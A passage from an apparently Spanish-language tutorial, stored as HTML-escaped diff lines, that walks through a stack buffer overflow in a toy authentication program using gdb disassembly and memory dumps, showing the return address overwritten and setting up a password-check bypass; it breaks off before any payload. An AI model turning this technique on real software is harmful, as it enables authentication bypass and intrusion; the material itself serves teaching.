+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048414&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;test&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bd&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;je&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484e5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bf&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485fb&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484c6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484cb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048619&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d7&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048630&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484de&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;0x80484f1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x804864d&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ec&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484f1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;leave&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484f2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;ret&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;dump.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;0x080484b6 &amp;lt;main&amp;gt;: call 0x8048414 &amp;lt;check_authentication&amp;gt;&lt;/code&gt; es la llamada a la función, y está ubicada en 0x080484b6. Antes de hacer la llamada se crea el marco de pila y se guarda la dirección de retorno en la pila, la cual es 0x080484bb.&lt;/p&gt;
+&lt;p&gt;Volvamos a examinar el programa:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdb -q auth_overflow2.c.binary
+Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lib/tls/i686/cmov/libthread_db.so.1&amp;#34;&lt;/span&gt;.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/hkr/booksrc/auth_overflow2.c.binary
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:9
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7e0:
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;�o������b����o���G���20205�04bb����204�04b�����20205�04bh��������02&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000      0xb7fd6ff4      0xbffff8a0      0xbffff808
+0xbffff7ec:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff808
+0xbffff7fc:     0x080484bb      0xbffff9f8      0x08048510      0xbffff868
+0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7e0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0x41414141      0x41414141      0x41414141
+0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7fc:     0x08004141      0xbffff9f8      0x08048510      0xbffff868
+0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Al examinar &lt;em&gt;x/16xw &amp;amp;auth;_flag&lt;/em&gt; podemos ver que en 0xbffff7fc está almacenada la dirección de retorno (0x080484bb), la cual sobrescribimos al desbordar el buffer como se vé en la salida de &lt;em&gt;x/16xw &amp;amp;auth;_flag&lt;/em&gt; tras ejecutar la instrucción &lt;em&gt;strcpy(password_buffer, password);&lt;/em&gt; y almacenar una contraseña demasiado grande en un array demasiado pequeño&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000      0x41414141      0x41414141      0x41414141
+0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7fc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x08004141&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0xbffff9f8      0x08048510      0xbffff868
+0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Entre paréntesis se observa cómo ha quedado machacada la dirección de retorno, con lo cual EIP intentará ejecutar la instrucción que haya en esa dirección aleatoria, provocando el fallo de segmentación.&lt;/p&gt;
+&lt;p&gt;¿Cómo podemos conseguir saltarnos la comprobación de la contraseña y que siempre nos de acceso?&lt;/p&gt;
+&lt;p&gt;Tenemos que sobrescribir la dirección de retorno con una dirección que nos convenga, veamos de nuevo la porción del main en ensamblador que nos interesa:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048414&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;test&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bd&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;je&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484e5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bf&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485fb&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484c6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484cb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048619&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d7&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048630&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484de&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;0x80484f1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x804864d&lt;/span&gt;
